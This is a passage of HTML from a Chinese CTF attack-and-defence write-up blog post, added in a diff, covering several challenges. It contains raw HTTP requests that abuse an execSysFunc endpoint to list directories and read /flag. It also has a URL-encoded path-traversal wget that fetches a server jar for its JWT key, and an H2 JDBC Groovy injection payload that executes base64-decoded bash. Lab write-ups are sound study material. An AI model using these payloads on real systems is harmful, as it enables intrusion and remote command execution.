+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;135&#34;, &#34;Not-A.Brand&#34;;v=&#34;8&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Type: application/json
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua-Mobile: ?0
+</span></span></span><span class="line"><span class="cl"><span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: */*
+</span></span></span><span class="line"><span class="cl"><span class="err">Origin: https://eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Site: same-origin
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Mode: cors
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Dest: empty
+</span></span></span><span class="line"><span class="cl"><span class="err">Referer: https://eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80/
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding: gzip, deflate, br
+</span></span></span><span class="line"><span class="cl"><span class="err">Priority: u=1, i
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">{&#34;File&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34;return&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">],&#34;Directory&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">],&#34;Pwd&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">],&#34;Flag&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34;return&#34;],&#34;FuncName&#34;:&#34;getDirectory&#34;,&#34;Param&#34;:&#34;/tmp/zxx&#34;}
+</span></span></span></code></pre></div></div><p><strong>请求三</strong></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">http</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="http"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="err">POST /execSysFunc HTTP/2
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 88
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua-Platform: &#34;macOS&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: zh-CN,zh;q=0.9
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;135&#34;, &#34;Not-A.Brand&#34;;v=&#34;8&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Type: application/json
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua-Mobile: ?0
+</span></span></span><span class="line"><span class="cl"><span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: */*
+</span></span></span><span class="line"><span class="cl"><span class="err">Origin: https://eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Site: same-origin
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Mode: cors
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Dest: empty
+</span></span></span><span class="line"><span class="cl"><span class="err">Referer: https://eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80/
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding: gzip, deflate, br
+</span></span></span><span class="line"><span class="cl"><span class="err">Priority: u=1, i
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">{&#34;File&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">],&#34;Directory&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">],&#34;Pwd&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">],&#34;Flag&#34;:[],&#34;FuncName&#34;:&#34;getFile&#34;,&#34;Param&#34;:&#34;/flag&#34;}
+</span></span></span></code></pre></div></div><h4 id="fix">fix</h4>
+<p>看着修</p>
+<h3 id="security_rasp">security_rasp</h3>
+<p>百度的 openrasp, 然后给了个反序列化入口, 打的应该是绕过黑名单</p>
+<h4 id="attack-2">attack</h4>
+<p>不会, 我讨厌 java</p>
+<h4 id="fix-2">fix</h4>
+<p>把所有 return 全部改成 block</p>
+<h3 id="ota">OTA</h3>
+<h4 id="attack-3">attack</h4>
+<p><code>wget url/static/%2f/%2f/%2e%2e/%2f/%2f/%2e%2e/opt/ota.jar</code>
+把文件下来弄到jwtkey, 然后伪造 session,执行命令
+然后打groovy</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    &#34;jdbcUrl&#34;: &#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS &#39;@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\&#34;bash -c {echo,cmd}|{base64,-d}|{bash,-i}\&#34;)})def x&#39;&#34;,
+</span></span><span class="line"><span class="cl">    &#34;username&#34;: &#34;sa&#34;,
+</span></span><span class="line"><span class="cl">    &#34;password&#34;: &#34;11111111&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div></div><h4 id="fix-3">fix</h4>
+<p>路径穿越,更新一下 spring-parent 从 3.3.3换到3.3.4</p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/finance" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Finance</p>
+            </a>
+            
+
+            
+            <a href="/post/%e5%ae%9e%e4%b9%a0%e4%b8%80%e5%91%a8" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">实习一周</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
